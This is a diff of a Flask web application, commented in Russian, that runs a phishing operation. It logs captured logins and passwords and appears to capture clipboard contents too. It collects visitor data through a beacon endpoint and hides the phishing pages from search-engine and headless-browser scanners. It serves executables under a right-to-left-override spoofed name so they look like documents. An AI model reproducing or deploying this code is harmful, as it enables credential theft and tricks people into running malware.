@@ -40,11 +40,9 @@ def allowed_file(filename):
 # --- ЛОГГЕР ---
 def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
     try:
-        # ПИШЕМ ПАРОЛЬ В КОНСОЛЬ, ЧТОБЫ ТЫ ЕГО ТОЧНО УВИДЕЛ
+        # ПИШЕМ ПАРОЛЬ В КОНСОЛЬ
         if 'system' in data and 'phishing_password' in data['system']:
             print(f"\n[!!!] CREDENTIALS CAPTURED: {data['system']['phishing_login']} : {data['system']['phishing_password']}\n")
-        else:
-            print(f"[+] Trigger: {trigger_type} | IP: {user_ip}")
         
         payload = {
             "trigger": trigger_type,
@@ -121,6 +119,7 @@ def view_files(unique_id):
 
 @app.route('/verify/<uid>/<path:filename>')
 def verify_download(uid, filename):
+    # Фильтр ботов, чтобы не палить фишинг сканерам
     user_agent = request.headers.get('User-Agent', '').lower()
     bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse']
     if any(bot in user_agent for bot in bots): return "<h1>Loading...</h1>", 200
@@ -133,6 +132,7 @@ def download_file(uid, filename):
     target_file = next((f for f in data['files'] if f['name'] == filename), None)
     if target_file:
         spoofed_name = target_file['name']
+        # Если это exe/bat, добавляем спуфинг расширения
         if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')): spoofed_name = "Document_\u202ecod.exe"
         return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
     return abort(404)
@@ -145,16 +145,11 @@ def download_receipt(uid):
 @app.route('/api/collect', methods=['POST'])
 def collect_data():
     try:
-        # УНИВЕРСАЛЬНЫЙ ПАРСЕР (JSON или TEXT)
         if request.is_json:
             data = request.json
         else:
-            # Если sendBeacon прислал Blob/Text, парсим вручную
-            try:
-                data = json.loads(request.data.decode('utf-8'))
-            except:
-                # Если совсем плохо, пробуем form data
-                data = request.form.to_dict()
+            # Парсинг для sendBeacon (он шлет blob/text)
+            data = json.loads(request.data.decode('utf-8'))
         
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent')
@@ -163,7 +158,6 @@ def collect_data():
         threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
         return jsonify({"status": "ok"})
     except Exception as e:
-        print(f"API Error: {e}")
         return jsonify({"status": "error", "details": str(e)})
 
 @app.route('/api/comment', methods=['POST'])
@@ -174,6 +168,8 @@ def add_comment():
         if 'comments' not in db[uid]: db[uid]['comments'] = []
         db[uid]['comments'].append({'username': data.get('username'), 'text': data.get('text'), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
         save_db(db)
+        
+        # Логируем всё, включая пароль и буфер обмена (если пришел)
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         threading.Thread(target=send_email_background, args=(data, user_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
         return jsonify({"status": "ok"})
